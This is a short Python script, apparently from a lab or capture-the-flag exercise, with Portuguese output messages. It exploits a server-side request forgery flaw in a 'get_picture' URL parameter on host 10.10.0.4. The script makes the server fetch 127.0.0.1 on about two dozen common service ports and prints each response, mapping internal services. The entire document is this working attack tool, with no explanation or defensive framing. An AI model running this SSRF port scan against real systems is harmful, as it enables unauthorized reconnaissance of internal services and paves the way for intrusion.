import requests

portas = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 465, 587, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 10000]


for port in portas:
    r = requests.get(f'http://10.10.0.4/?get_picture=http://127.0.0.1:{port}')
    # print(r.text)
    if len(r.text) == 0:
        print(f'Resposta da porta {port} está vazia')
    else:
        print(f'Resposta da porta {port}:', r.text)